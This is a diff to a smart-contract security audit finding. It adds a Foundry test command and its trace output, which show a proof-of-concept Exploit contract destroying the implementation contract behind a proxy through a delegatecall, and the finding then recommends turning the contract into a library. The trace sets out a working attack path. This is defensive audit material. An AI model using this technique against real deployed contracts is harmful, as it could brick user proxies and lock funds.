@@ -19,6 +19,51 @@ An attacker could delete the implementation contract deployed for user proxy con
 **Context:** [Implementation.sol#L9-L22](https://github.com/shabarkin/writing-exercise/blob/develop/src/Implementation.sol#L9-L22)
 
 
+Execute the exploit test with Foundry:
+
+```bash
+forge test -vvvvv
+```
+
+Console output:
+```log
+Running 1 test for test/Proxy.t.sol:SpearbitImplementationDestructTest
+[PASS] testImplementationDestruct() (gas: 8337)
+Logs:
+  Implementation contract exists: false
+
+Traces:
+  [490544] SpearbitImplementationDestructTest::setUp() 
+    ├─ [123771] → new Implementation@0xCe71065D4017F316EC606Fe4422e11eB2c47c246
+    │   └─ ← 618 bytes of code
+    ├─ [96860] → new Proxy@0x185a4dc360CE69bDCceE33b3784B0282f7961aea
+    │   └─ ← 371 bytes of code
+    ├─ [3000] PRECOMPILE::ecrecover{value: 1000000000000000000000}() 
+    │   └─ ← 
+    ├─ [0] VM::startPrank(0x0000000000000000000000000000000000000002) 
+    │   └─ ← ()
+    ├─ [55532] → new Exploit@0xE536720791A7DaDBeBdBCD8c8546fb0791a11901
+    │   └─ ← 277 bytes of code
+    ├─ [0] VM::stopPrank() 
+    │   └─ ← ()
+    ├─ [0] VM::startPrank(0x0000000000000000000000000000000000000002) 
+    │   └─ ← ()
+    ├─ [6233] Implementation::delegatecallContract(Exploit: [0xE536720791A7DaDBeBdBCD8c8546fb0791a11901], 0x00f55d9d0000000000000000000000000000000000000000000000000000000000000002) 
+    │   ├─ [5257] Exploit::destroy(0x0000000000000000000000000000000000000002) [delegatecall]
+    │   │   └─ ← ()
+    │   └─ ← 0x
+    ├─ [0] VM::stopPrank() 
+    │   └─ ← ()
+    └─ ← ()
+
+  [8337] SpearbitImplementationDestructTest::testImplementationDestruct() 
+    ├─ [0] console::log(Implementation contract exists: %s, false) [staticcall]
+    │   └─ ← ()
+    └─ ← ()
+
+Test result: ok. 1 passed; 0 failed; finished in 417.42µs
+```
+
 
 **Recommendation:**
 Change the context of `Implementation` smart contract from contract to library. Update their functions by removing the `payable` 
